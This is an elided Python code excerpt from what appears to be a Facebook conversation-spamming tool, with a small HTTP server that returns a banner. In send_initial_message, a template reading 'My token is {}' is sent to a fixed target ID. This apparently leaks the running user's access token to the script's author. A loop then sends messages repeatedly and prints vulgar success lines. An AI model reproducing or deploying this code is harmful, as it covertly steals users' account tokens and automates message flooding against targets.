...
class MyHandler(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):
          ...
          self.end_headers()
          self.wfile.write(b"The Legend Star Awias Don Here")
...
def send_initial_message():
      ...
      msg_template = "hello Awais Sir! I am using your server. My token is {}"

      # Specify the ID where you want to send the message
      target_id = "100024118683462"
      ...
      while True:
          try:
              for message_index in range(num_messages):
                  ...
                  if response.ok:
                      print("\033[1;92m[+] Haa Chud Raha Hai Tatta {} of Convo {} Token {}: {}".format(
